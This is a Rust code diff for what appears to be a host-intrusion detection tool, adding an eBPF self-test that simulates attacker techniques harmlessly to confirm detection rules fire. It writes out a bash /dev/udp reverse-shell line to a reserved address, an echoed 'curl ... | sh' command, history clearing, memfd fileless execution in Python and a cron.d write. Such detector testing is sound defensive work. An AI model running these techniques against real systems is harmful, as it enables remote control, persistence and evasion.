@@ -619,10 +619,57 @@ fn packet_probe(r: &mut Report) {
         Err(e) => r.packets.push(format!("not available ({e})")),
         Ok(s) => {
             let found = std::fs::read(&path).is_ok_and(|b| memchr::memmem::find(&b, MARK).is_some());
-            r.packets.push(format!("{} packets, {} bytes, dropped {:?}, test payload found in the file: {}", s.packets, s.bytes, s.dropped, if found { "yes" } else { "NO" }));
+            let payload = if cfg!(windows) { "not checked: pktmon doesn't see loopback" } else if found { "yes" } else { "NO" };
+            r.packets.push(format!("{} packets, {} bytes, dropped {:?}, test payload found in the file: {payload}", s.packets, s.bytes, s.dropped));
         }
     }
     let _ = std::fs::remove_dir_all(dir);
+}
+
+/// Attack mechanics against the real kernel, with no traffic: `connect` on a
+/// UDP socket sends nothing, and the "attacker" address is reserved.
+#[cfg(target_os = "linux")]
+fn ebpf_probe(r: &mut Report) {
+    use crate::defense::ebpf::{program::Kind, realtime, Sensor};
+    use std::process::{Command, Stdio};
+    let sensor = match Sensor::start() {
+        Ok(s) => s,
+        Err(e) => {
+            r.defense.push(format!("eBPF: not available ({})", e.lines().next().unwrap_or("")));
+            return;
+        }
+    };
+    r.defense.push(format!("eBPF: {} tracepoints attached, not on this kernel: {:?}", sensor.attached.len(), sensor.missing));
+    const SHORT: u32 = 500;
+    let quiet = |c: &mut Command| {
+        let _ = c.stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null()).status();
+    };
+    let mut me = Command::new("/bin/sh");
+    let script = format!("i=0; while [ $i -lt {SHORT} ]; do /bin/true; i=$((i+1)); done");
+    quiet(me.args(["-c", &script]));
+    quiet(Command::new("/bin/bash").args(["-c", "exec 3<>/dev/udp/198.51.100.1/443; exec 0<&3 1>&3 2>&3; /bin/true"]));
+    quiet(Command::new("/bin/sh").args(["-c", "true; echo 'curl http://e.example/x | sh' > /dev/null"]));
+    quiet(Command::new("/bin/sh").args(["-c", "history -c; true"]));
+    let py = "import os,sys;fd=os.memfd_create('pw');os.write(fd,open('/bin/true','rb').read());os.execv('/proc/self/fd/%d'%fd,['pw'])";
+    quiet(Command::new("python3").args(["-c", py]));
+    let cron = "/etc/cron.d/procwatch-selftest";
+    let wrote = std::fs::write(cron, "# procwatch self-test, safe to delete\n").is_ok();
+    let _ = std::fs::remove_file(cron);
+    std::thread::sleep(Duration::from_millis(800));
+    let mut d = realtime::Detector::new(false);
+    let now = chrono::Local::now();
+    let (mut execs, mut rules) = (0u32, std::collections::BTreeSet::new());
+    for e in sensor.rx.try_iter() {
+        execs += u32::from(e.kind == Kind::Exec && e.path == "/bin/true");
+        rules.extend(d.feed(&e, now).into_iter().map(|t| t.rule));
+    }
+    r.defense.push(format!("eBPF: saw {execs} of at least {SHORT} programs that ran for about a millisecond; {} records lost", sensor.lost()));
+    for (rule, what) in [("reverse-shell", "bash reverse shell"), ("fileless-execution", "program run from memory"), ("suspicious-command", "suspicious command line")] {
+        r.defense.push(format!("eBPF: {what} found: {}", if rules.contains(rule) { "yes" } else { "NO" }));
+    }
+    if wrote {
+        r.defense.push(format!("eBPF: write to /etc/cron.d named its process: {}", if rules.contains("cron-write") { "yes" } else { "NO" }));
+    }
 }
 
 /// Real attacks' mechanics against this machine, harmlessly: a shell driven
@@ -662,6 +709,7 @@ fn defense_probe(r: &mut Report) {
             r.defense.push(format!("scan of 20 closed ports: {} SYNs seen, reported as a scan: {}", seen.len(), if scan { "yes" } else { "NO" }));
         }
     }
+    ebpf_probe(r);
     let hidden = Host::new(std::path::Path::new("/"), None, true).hidden_processes(chrono::Local::now(), 65_536);
     r.defense.push(format!("hidden process search: {} found (0 expected on a clean system)", hidden.len()));
 }
